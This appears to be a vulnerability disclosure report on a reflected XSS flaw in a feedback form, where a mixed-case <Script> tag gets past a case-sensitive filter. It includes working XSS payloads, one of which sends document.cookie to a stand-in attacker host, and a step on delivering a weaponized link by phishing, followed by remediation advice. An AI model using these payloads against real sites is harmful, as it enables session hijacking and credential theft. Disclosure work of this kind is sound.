## Title
Unauthenticated Reflected XSS Bypasses Case-Sensitive Filter Allowing Arbitrary JavaScript Execution

## OWASP - Vulnerability
OWASP Top 10 2025 - A05 Injection

## Description
An unauthenticated Reflected Cross-Site Scripting (XSS) vulnerability exists in the website's feedback form (fname and lname parameters). The server reflects user input into the HTTP response without context-aware output encoding, and the existing <script> filter is case-sensitive, so a mixed-case <Script> tag bypasses it and executes arbitrary JavaScript in a victim's browser.

## Vulnerable Endpoint
`https://feedback.pwnedbox.site/?fname=&lname=`

## Payload Used
```
  cybrnoob'"<><Script>alert(document.location)</Script>
  cybrnoob'"<><Script>cosole.error(document.location)</Script>
  cybrnoob'"<><Script>fetch('https://attacker.tld/steal?c='+document.cookie)</Script>
```
## POC / Steps to Reproduce
1. Interact with the text box at `https://feedback.pwnedbox.site` and observe whether the input `cybrnoob'"<>` is reflected in the source.
    <img width="756" height="491" alt="SCR-20261121-rxvg" src="https://github.com/user-attachments/assets/bd8e65e5-7375-4114-88bf-d9af7057dbe4" />
2. Inject the javascript in the text box to see if it is executed.
   - Here it can be seen that the `<script>` tag is being filtered.
    <img width="756" height="491" alt="SCR-20261121-rzjn" src="https://github.com/user-attachments/assets/aacb87c9-8f4c-4d13-a1e7-a95018f1d6ce" />
    <img width="756" height="491" alt="SCR-20261121-rznp" src="https://github.com/user-attachments/assets/a2e8e37f-8170-4cd9-a1e3-1e86b98bebd8" />
3. Verify whether filtering mechanism is case agnostic with a combination of uppercase and lowercase version of the tag.
    - For example:
      ```
      <Script>
      <sCript>
      ...
      ```
  - Note: `alert(), confirm(), prompt(), console.log(), console.error(), fetch()` all generate valid responses.
     - Here it can be seen that the injected payload executes seamlessly.
     <img width="756" height="491" alt="SCR-20261121-tpud" src="https://github.com/user-attachments/assets/63488f6f-1e61-44c4-8851-31814e8d7069" />
      <img width="756" height="491" alt="SCR-20261121-tpog" src="https://github.com/user-attachments/assets/5e304df4-4454-42bb-9502-e24b6ea89245" />
3. Craft a weaponized URL (e.g., `https://feedback.pwnedbox.site/?fname=&lname=<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.

## Impact / Risk
1. An attacker can steal session cookies and impersonate the victim.
2. Malicious script can display fake login forms and steal credentials.
3. The script can redirect users, alter page content, or perform actions on their behalf.

## Recommendation
1. Never trust any user input. Treat fname and lname as untrusted.
2. Sanitize the input and remove HTML tags server-side instead of relying on a case-sensitive blocklist.
3. Apply context-aware HTML encoding on output so reflected input is rendered as text and never as executable markup.
4. Use a vetted encoding library, add a restrictive Content Security Policy, and set HttpOnly and SameSite on session cookies as defense in depth.
